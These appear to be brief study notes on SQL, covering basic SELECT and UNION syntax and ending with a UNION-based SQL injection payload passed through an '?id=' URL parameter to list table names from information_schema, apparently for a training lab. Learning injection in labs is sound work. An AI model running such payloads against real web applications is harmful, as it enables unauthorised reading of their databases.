SELECT
    SELECT column_name FROM table_name;
    SELECT * FROM table_name;
    SELECT first_name, second_name FROM people;

UNION (adds a second cmd):
    SELECT first_name FROM people UNION SELECT second_name FROM people;

look up keywords: 
    ?id=0 UNION SELECT "a","b",group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
